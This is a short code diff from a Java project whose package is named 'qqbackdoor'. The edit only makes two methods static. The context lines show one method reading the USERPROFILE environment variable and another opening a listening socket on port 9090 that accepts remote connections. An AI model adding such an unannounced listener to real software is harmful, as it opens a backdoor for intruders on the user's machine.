@@ -4,7 +4,7 @@ package com.qqTechnologies.qqbackdoor;
 
 public class User {
   
-  public void Write() {
+  public static void Write() {
     try 
     {
     System.getenv("USERPROFILE");
@@ -29,7 +29,7 @@ public class User {
     }
     }
 
-    public void Read() {
+    public static void Read() {
     try (ServerSocket serverSocket = new ServerSocket(9090)) {
         try (Socket clientSocket = serverSocket.accept();
              InputStream in = clientSocket.getInputStream();
